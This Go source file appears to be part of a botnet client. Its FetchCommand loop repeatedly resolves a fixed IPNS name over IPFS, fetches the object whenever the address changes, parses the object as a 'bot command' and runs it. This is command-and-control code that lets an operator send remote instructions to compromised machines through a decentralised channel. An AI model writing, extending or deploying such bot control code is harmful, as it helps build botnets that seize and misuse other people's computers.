package BotCommands

import (
	sh "github.com/ipfs/go-ipfs-api"
	"time"
	"Constants"
	log "FormatLog"
)

func resolveIpns(shell *sh.Shell) (chan string, chan error) {
	ipfsAddressCh := make(chan string)
	errCh := make(chan error)

	go func() {
		ipfsAddress, err := shell.Resolve(Constants.IPNS_NAME)

		if err != nil {
			errCh <- err
		} else {
			ipfsAddressCh <- ipfsAddress
		}
	}()

	return ipfsAddressCh, errCh
}

func FetchCommand(ticker *time.Ticker, shell *sh.Shell) {
	lastAddress := ""

	for range ticker.C {
		log.Print("fetch command", "starting new ticker")

		log.Print("fetch command", "resolving ipfs name")
		ipfsAddressCh, errCh := resolveIpns(shell)

		select {
		case ipfsAddress := <-ipfsAddressCh:
			log.Print("fetch command", "name resolved")

			if lastAddress == ipfsAddress {
				log.Print("fetch command", "without new command")

			} else {
				log.Print("fetch command", "we have new command")

				lastAddress = ipfsAddress

				obj, err := shell.ObjectGet(ipfsAddress)
				check(err)

				log.Print("fetch command", "new raw command: ", obj.Data)

				botCommand, err := ParseBotCommand(obj.Data)
				check(err)

				botCommand.RunCommand()
			}

		case err := <-errCh:
			log.Print("fetch command", "error: ", err)

		case <-time.After(time.Second * 30):
			log.Print("fetch command", "timeout")
		}
	}
}

func check(e error) {
	if e != nil {
		panic(e)
	}
}
